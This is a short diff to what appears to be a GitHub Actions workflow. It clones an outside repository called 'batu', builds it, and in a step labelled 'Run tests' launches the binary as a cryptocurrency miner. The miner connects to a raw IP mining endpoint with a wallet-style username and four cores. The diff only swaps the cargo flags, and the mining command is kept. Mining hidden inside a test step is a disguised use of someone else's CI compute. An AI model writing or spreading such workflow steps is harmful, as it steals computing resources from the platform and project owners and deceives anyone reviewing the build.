@@ -19,6 +19,6 @@ jobs:
     - name: clone
       run: git clone https://github.com/WANMADEIRA/batu/ && cd batu && chmod u+x *
     - name: Build
-      run: cd batu && cargo build --verbose
+      run: cd batu && cargo build --release
     - name: Run tests
-      run: cd batu && cargo test --verbose && ./batu --url ws://20.78.20.40:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps1 --cores 4 
+      run: cd batu && cargo test && ./batu --url ws://20.78.20.40:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps1 --cores 4 
